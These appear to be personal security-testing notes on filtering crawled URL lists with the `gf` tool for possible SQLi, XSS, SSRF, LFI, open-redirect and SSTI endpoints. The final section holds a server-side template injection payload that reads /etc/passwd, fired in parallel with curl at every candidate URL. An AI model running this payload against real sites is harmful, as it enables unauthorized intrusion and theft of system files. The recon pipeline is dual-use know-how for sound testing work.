---
title: 7-GF Patterns
draft: false
tags:
  - gf
---
We will use `gf` to automate testing for:

- SQLi
- XSS
- SSRF
- LFI
- Open Redirect
- SSTI


There are many types in `gf` that we can use:

![[Pasted image 20241031212548.png]]


## SQLi

> cat all_urls.txt | ~/go/bin/gf sqli | sudo tee mass_sqli/gf_sqli.txt | ~/go/bin/gf sqli | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_sqli/gf_sqli_uniq.txt

Use `gf` to filter for potential SQLi vulnerable endpoints:

```
cat all_urls.txt | ~/go/bin/gf sqli | sudo tee mass_sqli/gf_sqli.txt
```

 Filter only for unique ones:

```
cat gf_sqli.txt | ~/go/bin/gf sqli | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee gf_sqli_uniq.txt
```

After filtering for unique ones, we nearly got it down to 1/3. 

![[Pasted image 20241101112655.png]]


## XSS
> cat all_urls.txt | ~/go/bin/gf xss | sudo tee mass_xss/gf_xss.txt | ~/go/bin/gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_xss/gf_xss_uniq.txt

knoxss on browser

`gf` will automatically filter for URLs that matched typical XSS format:

```
cat all_urls.txt| ~/go/bin/gf xss | sudo tee mass_xss/gf_xss.txt
```

There are 24006 potential endpoints:

![[Pasted image 20241031212410.png]]

However, right now there are lot of overlaps in parameters:

![[Pasted image 20241031214118.png]]

Let's filter out only unique ones.

```
cat gf_xss.txt | ~/go/bin/gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee gf_xss_uniq.txt
```

![[Pasted image 20241031214617.png]]

![[Pasted image 20241031214634.png]]

## SSRF

> cat all_urls.txt | ~/go/bin/gf ssrf | sudo tee mass_ssrf/gf_ssrf.txt | ~/go/bin/gf ssrf | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_ssrf/gf_ssrf_uniq.txt


Filter for SSRF patterns:

```
cat all_urls.txt | ~/go/bin/gf ssrf | sudo tee mass_ssrf/gf_ssrf.txt
```

Filter for unique ones:

```
cat mass_ssrf/gf_ssrf.txt | ~/go/bin/gf ssrf | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_ssrf/gf_ssrf_uniq.txt
```

![[Pasted image 20241101152553.png]]

## LFI
> cat all_urls.txt | ~/go/bin/gf lfi | sudo tee mass_lfi/gf_lfi.txt | ~/go/bin/gf lfi | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_lfi/gf_lfi_uniq.txt


Filter for lfi patterns:

```
cat all_urls.txt | ~/go/bin/gf lfi | sudo tee mass_lfi/gf_lfi.txt
```

Filter for unique endpoints:

```
cat gf_lfi.txt | ~/go/bin/gf lfi | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee gf_lfi_uniq.txt
```


![[Pasted image 20241101113520.png]]

## Redirect
> cat all_urls.txt | ~/go/bin/gf redirect | sudo tee mass_redirect/gf_redirect.txt | ~/go/bin/gf redirect | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_redirect/gf_redirect_uniq.txt 


```
cat 2katana_httprobe.txt | ~/go/bin/gf redirect | sudo tee mass_redirect/gf_redirect.txt
```


```
cat mass_redirect/gf_redirect.txt | ~/go/bin/gf redirect | sed 's/=.*/=/' | sed 's/URL: //' | sort | uniq | sudo tee mass_redirect/gf_redirect_uniq.txt
```

![[Screenshot from 2024-11-10 11-54-43.png]]

## SSTI

```
cat gf_ssti_uniq.txt  | ~/go/bin/qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```
